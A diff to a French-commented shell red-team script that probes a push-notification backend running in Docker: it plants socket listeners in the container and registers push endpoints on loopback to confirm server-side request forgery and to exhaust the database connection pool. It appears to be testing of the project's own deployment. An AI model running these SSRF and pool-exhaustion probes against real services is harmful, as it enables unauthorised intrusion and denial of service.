@@ -49,10 +49,10 @@ C "$B/api/v1/groups/register" -X POST -H "$H" -H "$J" -d "{\"groupId\":\"$G\"}";
 
 # ---------------------------------------------------------------- A. SSRF
 T "A. SSRF — le serveur appelle-t-il l'URL d'endpoint qu'on choisit ?"
-$D exec -i "$BC" python3 - <<'PY' &
+cat > /tmp/rt_listen_a.py <<'PY'
 import socket
 s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-s.bind(("127.0.0.1", 8099)); s.listen(4); s.settimeout(25)
+s.bind(("127.0.0.1", 8099)); s.listen(4); s.settimeout(30)
 try:
     c, a = s.accept()
     data = c.recv(65536)
@@ -62,6 +62,8 @@ try:
 except socket.timeout:
     pass
 PY
+$D cp /tmp/rt_listen_a.py "$BC":/tmp/rt_listen_a.py
+$D exec -d "$BC" python3 /tmp/rt_listen_a.py
 sleep 1
 SUB='{"endpoint":"http://127.0.0.1:8099/ssrf-proof","keys":{"p256dh":"BOrHnQdBa3A0vHmR6GfV8mYqQ3sK9wZpLxT2rUvN4cDe","auth":"k8Jq2mN5xR7tY1zA"},"deviceId":"'"$DEV1"'","groupIds":["'"$G"'"]}'
 echo "-- subscribe endpoint=127.0.0.1:8099 (boucle locale DU CONTENEUR backend) :"
@@ -77,7 +79,10 @@ if [ -n "$HIT" ]; then
   printf '%s' "$HIT" | head -c 500; echo
   echo "  (le SERVEUR a POST vers une URL de notre choix — SSRF confirmé)"
 else
-  echo "  (rien reçu — logs listener: cat /tmp/rt-ssrf.log)"
+  echo "  (rien reçu — décharge des logs backend, fan-out) :"
+  $D logs "$BC" --since 5m 2>&1 | grep -iE "web push|fan-out|traceback" | tail -10
+  echo "  -- processus listeners dans le conteneur :"
+  $D exec "$BC" sh -c 'ps aux 2>/dev/null | grep -v grep | grep rt_ || echo "(aucun process listener)"'
 fi
 
 # ---------------------------------------------------------------- B. Overflow
@@ -109,7 +114,7 @@ T "D. DOUBLET — endpoint 'hold' x16 → épuisement du pool DB (5+10) ?"
 echo "-- latence de base (pull, DB) :"
 curl -sS -o /dev/null -w '  baseline: %{time_total}s [%{http_code}]\n' "$B/api/v1/groups/$G/ops?since=0" -H "$H"
 echo "-- hold server dans le conteneur (45 s, auto-quit) :"
-$D exec -i "$BC" python3 - <<'PY' &
+cat > /tmp/rt_hold.py <<'PY'
 import socket, time
 s = socket.socket(); s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 s.bind(("127.0.0.1", 8098)); s.listen(64); s.settimeout(45)
@@ -121,6 +126,8 @@ while time.time() < end:
         break
 print(n, "connexions holdées")
 PY
+$D cp /tmp/rt_hold.py "$BC":/tmp/rt_hold.py
+$D exec -d "$BC" python3 /tmp/rt_hold.py
 sleep 1
 SUBH='{"endpoint":"http://127.0.0.1:8098/hold","keys":{"p256dh":"BOrHnQdBa3A0vHmR6GfV8mYqQ3sK9wZpLxT2rUvN4cDe","auth":"k8Jq2mN5xR7tY1zA"},"deviceId":"'"$DEV1"'","groupIds":["'"$G"'"]}'
 C "$B/api/v1/push/subscribe" -X POST -H "$H" -H "$J" -d "$SUBH" > /dev/null
